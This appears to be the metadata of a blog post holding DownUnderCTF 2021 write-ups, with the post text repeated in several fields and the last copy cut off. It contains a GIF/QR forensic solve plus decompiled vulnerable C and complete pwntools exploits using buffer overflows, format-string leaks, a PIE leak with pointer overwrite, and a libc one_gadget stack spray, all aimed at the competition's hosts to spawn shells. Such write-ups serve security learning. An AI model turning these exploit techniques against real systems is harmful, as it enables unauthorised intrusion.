<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>DownUnderCTF2021 Writeups | th3_5had0w</title>
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="DownUnderCTF2021 Writeups" />
<meta name="author" content="th3_5had0w" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="DownunderCTF, the challenges were good i think, i spent my weekend playing this, but a little disappointed that i didn’t solve the heap note challenge in-time, i guess “emyeuheappwn” but “heappwnkhongyeuem” hehe… enough joking, let’s get started. To warm up things a little bit i’ll start with a basic forensic challenge that i think was pretty fun. How to pronounce GIF? The challenge provided us a GIF image which each of its frame is a part of some kind of QRCodes. First i used online service to split GIF into image frames. After scrolling through the image frames for a while, i realized there are 10 QRCode, each of those QRCodes was splitted into 11 parts. So i wrote a script to merge those splitted part together, and this is it: from PIL import Image for j in range(0, 10): pos = 0 ni = Image.new(&#39;RGB&#39;, (300, 22*12), (255, 255, 255)) image0 = Image.open(&#39;frame_00&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_01&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_02&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_03&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_04&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_05&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_06&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_07&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_08&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_09&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_10&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_11&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() name = &quot;dat&quot;+str(j)+&quot;.png&quot; ni.save(name, &quot;PNG&quot;) ni.close() Run this script and i have 10 qrcode, so i just have to scan these: Many of them were just garbages, and a rickroll link ヽ( ಠ益ಠ )ﾉ, nothing interesting, but then i saw there are 2 weird strings: RFVDVEZ7YU1 and fMV9oYVhYMHJfbjB3P30= i immediately realized these are two parts of a 64base encode, so i put them together, decoded it and got the flag: DUCTF{aM_1_haXX0r_n0w?} Deadcode This challenge is a basic buffer overflow challenge. int __cdecl main(int argc, const char **argv, const char **envp) { char v4[24]; // [rsp+0h] [rbp-20h] BYREF __int64 v5; // [rsp+18h] [rbp-8h] v5 = 0LL; buffer_init(argc, argv, envp); puts(&quot;\nI&#39;m developing this new application in C, I&#39;ve setup some code for the new features but it&#39;s not (a)live yet.&quot;); puts(&quot;\nWhat features would you like to see in my app?&quot;); gets(v4); if ( v5 == 0xDEADC0DELL ) { puts(&quot;\n\nMaybe this code isn&#39;t so dead...&quot;); system(&quot;/bin/sh&quot;); } return 0; } The program use the vulnerable function gets to get user data, so i just need to fill enough padđing and overwrite v5 variable with value 0xdeadc0de, here is my exploit script: from pwn import * payload = b&#39;A&#39;*24+p64(0xdeadc0de) io = remote(&#39;pwn-2021.duc.tf&#39;, 31916) io.sendline(payload) io.interactive() Flag: DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv} Leaking like a sieve This challenge is a basic format string challenge. int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { FILE *stream; // [rsp+8h] [rbp-58h] char format[32]; // [rsp+10h] [rbp-50h] BYREF char s[40]; // [rsp+30h] [rbp-30h] BYREF unsigned __int64 v6; // [rsp+58h] [rbp-8h] v6 = __readfsqword(0x28u); buffer_init(argc, argv, envp); stream = fopen(&quot;./flag.txt&quot;, &quot;r&quot;); if ( !stream ) { puts(&quot;The flag file isn&#39;t loading. Please contact an organiser if you are running this on the shell server.&quot;); exit(0); } fgets(s, 32, stream); while ( 1 ) { puts(&quot;What is your name?&quot;); fgets(format, 32, stdin); printf(&quot;\nHello there, &quot;); printf(format); putchar(10); } } The flag was loaded in already before we could input anything, also, the program uses printf without format specifier but pass in our input directly, so it would just be so easy to leak the flag in just one shot, here’s my exploit script: from pwn import * io = remote(&#39;pwn-2021.duc.tf&#39;, 31918) payload = &#39;%6$s&#39; print(io.recv()) io.sendline(payload) print(io.recvuntil(b&#39;Hello there, &#39;)) print(io.recv()) Flag: DUCTF{f0rm4t_5p3c1f13r_m3dsg!} Outbackdoor This challenge is still a classical buffer overflow challenge, but this time i’ll overwrite the return pointer instead of overwriting some variable. int __cdecl main(int argc, const char **argv, const char **envp) { char v4[16]; // [rsp+0h] [rbp-10h] BYREF buffer_init(argc, argv, envp); puts(&quot;\nFool me once, shame on you. Fool me twice, shame on me.&quot;); puts(&quot;\nSeriously though, what features would be cool? Maybe it could play a song?&quot;); gets(v4); return 0; } ... int outBackdoor() { puts(&quot;\n\nW...w...Wait? Who put this backdoor out back here?&quot;); return system(&quot;/bin/sh&quot;); } So i just need to padding enough to where the return pointer address was and overwrote it, then it’s done, my exploit script: from pwn import * io = remote(&#39;pwn-2021.duc.tf&#39;, 31921) print(io.recv()) payload = b&#39;A&#39;*24+p64(0x00000000004011d7+1) io.sendline(payload) io.interactive() Flag: DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s} Babygame Now this is a good challenge, not hard but really interesting tho. int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { int v3; // [rsp+Ch] [rbp-4h] init(argc, argv, envp); puts(&quot;Welcome, what is your name?&quot;); read(0, NAME, 0x20uLL); RANDBUF = &quot;/dev/urandom&quot;; while ( 1 ) { while ( 1 ) { print_menu(); v3 = get_num(); if ( v3 != 1337 ) break; game(); } if ( v3 &gt; 1337 ) { LABEL_10: puts(&quot;Invalid choice.&quot;); } else if ( v3 == 1 ) { set_username(); } else { if ( v3 != 2 ) goto LABEL_10; print_username(); } } } After taking a glance at main function, i would be able to notice something: the program first read my 32 bytes of input into NAME buffer, but the NAME buffer also 32 bytes long, and right after that is the pointer (RANDBUF) to the string &quot;/dev/urandom&quot; when i input the number 1337, the program will lead me to a function called game, also there are 2 functions called. Ok, there are 2 more functions i need to check, the set_username and print_username. size_t set_username() { FILE *v0; // rbx size_t v1; // rax puts(&quot;What would you like to change your username to?&quot;); v0 = stdin; v1 = strlen(NAME); return fread(NAME, 1uLL, v1, v0); } nt print_username() { return puts(NAME); } Hmm, now that the vulnerability showed up, at first the program asked me to input 32 byte which filled up the NAME buffer entirely, no nullbyte between RANDBUF and NAME, so when the program call print_username it will call puts function it will print not only my input but also leak the address of RANDBUF, it means i leaked PIE. The set_username read my into NAME buffer with the length is the return value of strlen(NAME) function, the strlen function only stop counting when it reach the nullbyte, but before this i’ve already filled up the NAME buffer entirely with 32 bytes, which means the strlen will now read 6 more bytes (length of RANDBUF’s address) because there are no nullbyte between them, then i’ll be able to input 32 + 6 = 38 bytes, enough to overwrite the address of RANDBUF. Now let’s checkout the mysterious game function: unsigned __int64 game() { FILE *stream; // [rsp+8h] [rbp-18h] int ptr; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); stream = fopen(RANDBUF, &quot;rb&quot;); fread(&amp;ptr, 1uLL, 4uLL, stream); printf(&quot;guess: &quot;); if ( get_num() == ptr ) system(&quot;/bin/sh&quot;); return v3 - __readfsqword(0x28u); } The program will open RANDBUF (RANDBUF = /dev/urandom) to read the first 4 bytes of it, if i could guess those 4 bytes correctly i’ll have a shell. But why do i have to guess, when i can just overwrite the RANDBUF pointer, so where do i overwrite RANDBUF buffer to point to? I will overwrite it to point right back at the beginning of the NAME buffer, and i use function set_username to both rewriting NAME buffer from garbage into &quot;flag.txt\0&quot; and overwriting the RANDBUF pointer, the first 4 bytes of flag.txt is always DUCT (0x54435544 in little-endian hexa), that’s a free shell isn’t it? Here’s my exploit: from pwn import * io = remote(&#39;pwn-2021.duc.tf&#39;, 31907) #io = process(&#39;./babygame&#39;) print(io.recv()) payload = b&#39;A&#39;*40 io.sendline(payload) print(io.recvuntil(&#39;&gt; &#39;)) print(io.recvuntil(&#39;&gt; &#39;)) io.sendline(&#39;2&#39;) io.recv(32) leak = u64(io.recv(6)+b&#39;\0\0&#39;) + 8316 print(hex(leak)) print(io.recvuntil(&#39;&gt; &#39;)) io.sendline(&#39;1&#39;) print(io.recv()) payload = b&#39;flag.txt&#39;+b&#39;\0&#39;*24+p64(leak) io.sendline(payload) print(io.recvuntil(&#39;&gt; &#39;)) print(io.recvuntil(&#39;&gt; &#39;)) io.sendline(&#39;1337&#39;) print(io.recv()) io.sendline(&#39;1413698884&#39;) io.interactive() Flag: DUCTF{whats_in_a_name?_5aacfc58} Oversight This challenge is funny, don’t know why but i like it, i also like a heapnote challenge, but somehow i couldnt do it in time, too stupid maybe? Dunno =]] int wait() { unsigned int v0; // eax char s[5]; // [rsp+Bh] [rbp-85h] BYREF char format[120]; // [rsp+10h] [rbp-80h] BYREF puts(&quot;Press enter to continue&quot;); getc(stdin); printf(&quot;Pick a number: &quot;); fgets(s, 5, stdin); v0 = strtol(s, 0LL, 10); snprintf(format, 0x64uLL, &quot;Your magic number is: %%%d$llx\n&quot;, v0); printf(format); return introduce(); } int introduce() { puts(&quot;Are you ready to echo?&quot;); get_num_bytes(); return puts(&quot;That was fun!&quot;); } int get_num_bytes() { unsigned int v0; // eax int result; // eax char s[13]; // [rsp+Bh] [rbp-15h] BYREF printf(&quot;How many bytes do you want to read (max 256)? &quot;); fgets(s, 5, stdin); v0 = strtol(s, 0LL, 10); if ( v0 &gt; 0x100 ) result = puts(&quot;Don&#39;t break the rules!&quot;); else result = echo(v0); return result; } The program first have format string vulnerability to leak data, which i used to leak libc, when finished leaking libc i overwrite the return pointer of get_num_bytes function to return to the one_gadget in libc by stack spraying technique, sometimes it doesn’t work, so if the shell doesn’t pop up just retry a few times, this is my script: from pwn import * #io = process(&#39;./oversight&#39;, env={&quot;LD_PRELOAD&quot;:&quot;./libc-2.27.so&quot;}) libc = ELF(&#39;./libc-2.27.so&#39;) io = remote(&#39;pwn-2021.duc.tf&#39;, 31909) print(io.recv()) io.send(b&#39;\n&#39;) print(io.recv()) io.sendline(b&#39;15&#39;) print(io.recvuntil(b&#39;Your magic number is: &#39;)) libc.address = int(io.recvline(), 16) - 0x8d4d3 print(io.recv()) payload = p64(libc.address+0x4f432)*25 + 6*b&#39;\0\0\0\0\0\0\0\0&#39; +b&#39;BBBBBBB&#39; io.sendline(&#39;256&#39;) io.sendline(payload) print(io.recv()) io.interactive() Flag: DUCTF{1_sm@LL_0ver5ight=0v3rFLOW} Thanks for reading my boring writeup, have a good day fellas =]]" />
<meta property="og:description" content="DownunderCTF, the challenges were good i think, i spent my weekend playing this, but a little disappointed that i didn’t solve the heap note challenge in-time, i guess “emyeuheappwn” but “heappwnkhongyeuem” hehe… enough joking, let’s get started. To warm up things a little bit i’ll start with a basic forensic challenge that i think was pretty fun. How to pronounce GIF? The challenge provided us a GIF image which each of its frame is a part of some kind of QRCodes. First i used online service to split GIF into image frames. After scrolling through the image frames for a while, i realized there are 10 QRCode, each of those QRCodes was splitted into 11 parts. So i wrote a script to merge those splitted part together, and this is it: from PIL import Image for j in range(0, 10): pos = 0 ni = Image.new(&#39;RGB&#39;, (300, 22*12), (255, 255, 255)) image0 = Image.open(&#39;frame_00&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_01&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_02&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_03&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_04&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_05&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_06&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_07&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_08&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_09&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_10&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_11&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() name = &quot;dat&quot;+str(j)+&quot;.png&quot; ni.save(name, &quot;PNG&quot;) ni.close() Run this script and i have 10 qrcode, so i just have to scan these: Many of them were just garbages, and a rickroll link ヽ( ಠ益ಠ )ﾉ, nothing interesting, but then i saw there are 2 weird strings: RFVDVEZ7YU1 and fMV9oYVhYMHJfbjB3P30= i immediately realized these are two parts of a 64base encode, so i put them together, decoded it and got the flag: DUCTF{aM_1_haXX0r_n0w?} Deadcode This challenge is a basic buffer overflow challenge. int __cdecl main(int argc, const char **argv, const char **envp) { char v4[24]; // [rsp+0h] [rbp-20h] BYREF __int64 v5; // [rsp+18h] [rbp-8h] v5 = 0LL; buffer_init(argc, argv, envp); puts(&quot;\nI&#39;m developing this new application in C, I&#39;ve setup some code for the new features but it&#39;s not (a)live yet.&quot;); puts(&quot;\nWhat features would you like to see in my app?&quot;); gets(v4); if ( v5 == 0xDEADC0DELL ) { puts(&quot;\n\nMaybe this code isn&#39;t so dead...&quot;); system(&quot;/bin/sh&quot;); } return 0; } The program use the vulnerable function gets to get user data, so i just need to fill enough padđing and overwrite v5 variable with value 0xdeadc0de, here is my exploit script: from pwn import * payload = b&#39;A&#39;*24+p64(0xdeadc0de) io = remote(&#39;pwn-2021.duc.tf&#39;, 31916) io.sendline(payload) io.interactive() Flag: DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv} Leaking like a sieve This challenge is a basic format string challenge. int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { FILE *stream; // [rsp+8h] [rbp-58h] char format[32]; // [rsp+10h] [rbp-50h] BYREF char s[40]; // [rsp+30h] [rbp-30h] BYREF unsigned __int64 v6; // [rsp+58h] [rbp-8h] v6 = __readfsqword(0x28u); buffer_init(argc, argv, envp); stream = fopen(&quot;./flag.txt&quot;, &quot;r&quot;); if ( !stream ) { puts(&quot;The flag file isn&#39;t loading. Please contact an organiser if you are running this on the shell server.&quot;); exit(0); } fgets(s, 32, stream); while ( 1 ) { puts(&quot;What is your name?&quot;); fgets(format, 32, stdin); printf(&quot;\nHello there, &quot;); printf(format); putchar(10); } } The flag was loaded in already before we could input anything, also, the program uses printf without format specifier but pass in our input directly, so it would just be so easy to leak the flag in just one shot, here’s my exploit script: from pwn import * io = remote(&#39;pwn-2021.duc.tf&#39;, 31918) payload = &#39;%6$s&#39; print(io.recv()) io.sendline(payload) print(io.recvuntil(b&#39;Hello there, &#39;)) print(io.recv()) Flag: DUCTF{f0rm4t_5p3c1f13r_m3dsg!} Outbackdoor This challenge is still a classical buffer overflow challenge, but this time i’ll overwrite the return pointer instead of overwriting some variable. int __cdecl main(int argc, const char **argv, const char **envp) { char v4[16]; // [rsp+0h] [rbp-10h] BYREF buffer_init(argc, argv, envp); puts(&quot;\nFool me once, shame on you. Fool me twice, shame on me.&quot;); puts(&quot;\nSeriously though, what features would be cool? Maybe it could play a song?&quot;); gets(v4); return 0; } ... int outBackdoor() { puts(&quot;\n\nW...w...Wait? Who put this backdoor out back here?&quot;); return system(&quot;/bin/sh&quot;); } So i just need to padding enough to where the return pointer address was and overwrote it, then it’s done, my exploit script: from pwn import * io = remote(&#39;pwn-2021.duc.tf&#39;, 31921) print(io.recv()) payload = b&#39;A&#39;*24+p64(0x00000000004011d7+1) io.sendline(payload) io.interactive() Flag: DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s} Babygame Now this is a good challenge, not hard but really interesting tho. int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { int v3; // [rsp+Ch] [rbp-4h] init(argc, argv, envp); puts(&quot;Welcome, what is your name?&quot;); read(0, NAME, 0x20uLL); RANDBUF = &quot;/dev/urandom&quot;; while ( 1 ) { while ( 1 ) { print_menu(); v3 = get_num(); if ( v3 != 1337 ) break; game(); } if ( v3 &gt; 1337 ) { LABEL_10: puts(&quot;Invalid choice.&quot;); } else if ( v3 == 1 ) { set_username(); } else { if ( v3 != 2 ) goto LABEL_10; print_username(); } } } After taking a glance at main function, i would be able to notice something: the program first read my 32 bytes of input into NAME buffer, but the NAME buffer also 32 bytes long, and right after that is the pointer (RANDBUF) to the string &quot;/dev/urandom&quot; when i input the number 1337, the program will lead me to a function called game, also there are 2 functions called. Ok, there are 2 more functions i need to check, the set_username and print_username. size_t set_username() { FILE *v0; // rbx size_t v1; // rax puts(&quot;What would you like to change your username to?&quot;); v0 = stdin; v1 = strlen(NAME); return fread(NAME, 1uLL, v1, v0); } nt print_username() { return puts(NAME); } Hmm, now that the vulnerability showed up, at first the program asked me to input 32 byte which filled up the NAME buffer entirely, no nullbyte between RANDBUF and NAME, so when the program call print_username it will call puts function it will print not only my input but also leak the address of RANDBUF, it means i leaked PIE. The set_username read my into NAME buffer with the length is the return value of strlen(NAME) function, the strlen function only stop counting when it reach the nullbyte, but before this i’ve already filled up the NAME buffer entirely with 32 bytes, which means the strlen will now read 6 more bytes (length of RANDBUF’s address) because there are no nullbyte between them, then i’ll be able to input 32 + 6 = 38 bytes, enough to overwrite the address of RANDBUF. Now let’s checkout the mysterious game function: unsigned __int64 game() { FILE *stream; // [rsp+8h] [rbp-18h] int ptr; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); stream = fopen(RANDBUF, &quot;rb&quot;); fread(&amp;ptr, 1uLL, 4uLL, stream); printf(&quot;guess: &quot;); if ( get_num() == ptr ) system(&quot;/bin/sh&quot;); return v3 - __readfsqword(0x28u); } The program will open RANDBUF (RANDBUF = /dev/urandom) to read the first 4 bytes of it, if i could guess those 4 bytes correctly i’ll have a shell. But why do i have to guess, when i can just overwrite the RANDBUF pointer, so where do i overwrite RANDBUF buffer to point to? I will overwrite it to point right back at the beginning of the NAME buffer, and i use function set_username to both rewriting NAME buffer from garbage into &quot;flag.txt\0&quot; and overwriting the RANDBUF pointer, the first 4 bytes of flag.txt is always DUCT (0x54435544 in little-endian hexa), that’s a free shell isn’t it? Here’s my exploit: from pwn import * io = remote(&#39;pwn-2021.duc.tf&#39;, 31907) #io = process(&#39;./babygame&#39;) print(io.recv()) payload = b&#39;A&#39;*40 io.sendline(payload) print(io.recvuntil(&#39;&gt; &#39;)) print(io.recvuntil(&#39;&gt; &#39;)) io.sendline(&#39;2&#39;) io.recv(32) leak = u64(io.recv(6)+b&#39;\0\0&#39;) + 8316 print(hex(leak)) print(io.recvuntil(&#39;&gt; &#39;)) io.sendline(&#39;1&#39;) print(io.recv()) payload = b&#39;flag.txt&#39;+b&#39;\0&#39;*24+p64(leak) io.sendline(payload) print(io.recvuntil(&#39;&gt; &#39;)) print(io.recvuntil(&#39;&gt; &#39;)) io.sendline(&#39;1337&#39;) print(io.recv()) io.sendline(&#39;1413698884&#39;) io.interactive() Flag: DUCTF{whats_in_a_name?_5aacfc58} Oversight This challenge is funny, don’t know why but i like it, i also like a heapnote challenge, but somehow i couldnt do it in time, too stupid maybe? Dunno =]] int wait() { unsigned int v0; // eax char s[5]; // [rsp+Bh] [rbp-85h] BYREF char format[120]; // [rsp+10h] [rbp-80h] BYREF puts(&quot;Press enter to continue&quot;); getc(stdin); printf(&quot;Pick a number: &quot;); fgets(s, 5, stdin); v0 = strtol(s, 0LL, 10); snprintf(format, 0x64uLL, &quot;Your magic number is: %%%d$llx\n&quot;, v0); printf(format); return introduce(); } int introduce() { puts(&quot;Are you ready to echo?&quot;); get_num_bytes(); return puts(&quot;That was fun!&quot;); } int get_num_bytes() { unsigned int v0; // eax int result; // eax char s[13]; // [rsp+Bh] [rbp-15h] BYREF printf(&quot;How many bytes do you want to read (max 256)? &quot;); fgets(s, 5, stdin); v0 = strtol(s, 0LL, 10); if ( v0 &gt; 0x100 ) result = puts(&quot;Don&#39;t break the rules!&quot;); else result = echo(v0); return result; } The program first have format string vulnerability to leak data, which i used to leak libc, when finished leaking libc i overwrite the return pointer of get_num_bytes function to return to the one_gadget in libc by stack spraying technique, sometimes it doesn’t work, so if the shell doesn’t pop up just retry a few times, this is my script: from pwn import * #io = process(&#39;./oversight&#39;, env={&quot;LD_PRELOAD&quot;:&quot;./libc-2.27.so&quot;}) libc = ELF(&#39;./libc-2.27.so&#39;) io = remote(&#39;pwn-2021.duc.tf&#39;, 31909) print(io.recv()) io.send(b&#39;\n&#39;) print(io.recv()) io.sendline(b&#39;15&#39;) print(io.recvuntil(b&#39;Your magic number is: &#39;)) libc.address = int(io.recvline(), 16) - 0x8d4d3 print(io.recv()) payload = p64(libc.address+0x4f432)*25 + 6*b&#39;\0\0\0\0\0\0\0\0&#39; +b&#39;BBBBBBB&#39; io.sendline(&#39;256&#39;) io.sendline(payload) print(io.recv()) io.interactive() Flag: DUCTF{1_sm@LL_0ver5ight=0v3rFLOW} Thanks for reading my boring writeup, have a good day fellas =]]" />
<link rel="canonical" href="https://th3-5had0w.github.io/2021/09/27/downunderctf-2021.html" />
<meta property="og:url" content="https://th3-5had0w.github.io/2021/09/27/downunderctf-2021.html" />
<meta property="og:site_name" content="th3_5had0w" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-09-27T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="DownUnderCTF2021 Writeups" />
<script type="application/ld+json">
{"description":"DownunderCTF, the challenges were good i think, i spent my weekend playing this, but a little disappointed that i didn’t solve the heap note challenge in-time, i guess “emyeuheappwn” but “heappwnkhongyeuem” hehe… enough joking, let’s get started. To warm up things a little bit i’ll start with a basic forensic challenge that i think was pretty fun. How to pronounce GIF? The challenge provided us a GIF image which each of its frame is a part of some kind of QRCodes. First i used online service to split GIF into image frames. After scrolling through the image frames for a while, i realized there are 10 QRCode, each of those QRCodes was splitted into 11 parts. So i wrote a script to merge those splitted part together, and this is it: from PIL import Image for j in range(0, 10): pos = 0 ni = Image.new(&#39;RGB&#39;, (300, 22*12), (255, 255, 255)) image0 = Image.open(&#39;frame_00&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_01&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_02&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_03&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_04&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_05&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_06&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_07&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_08&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_09&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_10&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() image0 = Image.open(&#39;frame_11&#39;+str(j)+&#39;_delay-0.05s.png&#39;) ni.paste(image0, (0, pos)) pos+=21 image0.close() name = &quot;dat&quot;+str(j)+&quot;.png&quot; ni.save(name, &quot;PNG&quot;) ni.close() Run this script and i have 10 qrcode, so i just have to scan these: Many of them were just garbages, and a rickroll link ヽ( ಠ益ಠ )ﾉ, nothing interesting, but then i saw there are 2 weird strings: RFVDVEZ7YU1 and fMV9oYVhYMHJfbjB3P30= i immediately realized these are two parts of a 64base encode, so i put them together, decoded it and got the flag: DUCTF{aM_1_haXX0r_n0w?} Deadcode This challenge is a basic buffer overflow challenge. int __cdecl main(int argc, const char **argv, const char **envp) { char v4[24]; // [rsp+0h] [rbp-20h] BYREF __int64 v5; // [rsp+18h] [rbp-8h] v5 = 0LL; buffer_init(argc, argv, envp); puts(&quot;\\nI&#39;m developing this new application in C, I&#39;ve setup some code for the new features but it&#39;s not (a)live yet.&quot;); puts(&quot;\\nWhat features would you like to see in my app?&quot;); gets(v4); if ( v5 == 0xDEADC0DELL ) { puts(&quot;\\n\\nMaybe this code isn&#39;t so dead...&quot;); system(&quot;/bin/sh&quot;); } return 0; } The program use the vulnerable function gets to get user data, so i just need to fill enough padđing and overwrite v5 variable with value 0xdeadc0de, here is my exploit script: from pwn import * payload = b&#39;A&#39;*24+p64(0xdeadc0de) io = remote(&#39;pwn-2021.duc.tf&#39;, 31916) io.sendline(payload) io.interactive() Flag: DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv} Leaking like a sieve This challenge is a basic format string challenge. int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { FILE *stream; // [rsp+8h] [rbp-58h] char format[32]; // [rsp+10h] [rbp-50h] BYREF char s[40]; // [rsp+30h] [rbp-30h] BYREF unsigned __int64 v6; // [rsp+58h] [rbp-8h] v6 = __readfsqword(0x28u); buffer_init(argc, argv, envp); stream = fopen(&quot;./flag.txt&quot;, &quot;r&quot;); if ( !stream ) { puts(&quot;The flag file isn&#39;t loading. Please contact an organiser if you are running this on the shell server.&quot;); exit(0); } fgets(s, 32, stream); while ( 1 ) { puts(&quot;What is your name?&quot;); fgets(format, 32, stdin); printf(&quot;\\nHello there, &quot;); printf(format); putchar(10); } } The flag was loaded in already before we could input anything, also, the program uses printf without format specifier but pass in our input directly, so it would just be so easy to leak the flag in just one shot, here’s my exploit script: from pwn import * io = remote(&#39;pwn-2021.duc.tf&#39;, 31918) payload = &#39;%6$s&#39; print(io.recv()) io.sendline(payload) print(io.recvuntil(b&#39;Hello there, &#39;)) print(io.recv()) Flag: DUCTF{f0rm4t_5p3c1f13r_m3dsg!} Outbackdoor This challenge is still a classical buffer overflow challenge, but this time i’ll overwrite the return pointer instead of overwriting some variable. int __cdecl main(int argc, const char **argv, const char **envp) { char v4[16]; // [rsp+0h] [rbp-10h] BYREF buffer_init(argc, argv, envp); puts(&quot;\\nFool me once, shame on you. Fool me twice, shame on me.&quot;); puts(&quot;\\nSeriously though, what features would be cool? Maybe it could play a song?&quot;); gets(v4); return 0; } ... int outBackdoor() { puts(&quot;\\n\\nW...w...Wait? Who put this backdoor out back here?&quot;); return system(&quot;/bin/sh&quot;); } So i just need to padding enough to where the return pointer address was and overwrote it, then it’s done, my exploit script: from pwn import * io = remote(&#39;pwn-2021.duc.tf&#39;, 31921) print(io.recv()) payload = b&#39;A&#39;*24+p64(0x00000000004011d7+1) io.sendline(payload) io.interactive() Flag: DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s} Babygame Now this is a good challenge, not hard but really interesting tho. int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { int v3; // [rsp+Ch] [rbp-4h] init(argc, argv, envp); puts(&quot;Welcome, what is your name?&quot;); read(0, NAME, 0x20uLL); RANDBUF = &quot;/dev/urandom&quot;; while ( 1 ) { while ( 1 ) { print_menu(); v3 = get_num(); if ( v3 != 1337 ) break; game(); } if ( v3 &gt; 1337 ) { LABEL_10: puts(&quot;Invalid choice.&quot;); } else if ( v3 == 1 ) { set_username(); } else { if ( v3 != 2 ) goto LABEL_10; print_username(); } } } After taking a glance at main function, i would be able to notice something: the program first read my 32 bytes of input into NAME buffer, but the NAME buffer also 32 bytes long, and right after that is the pointer (RANDBUF) to the string 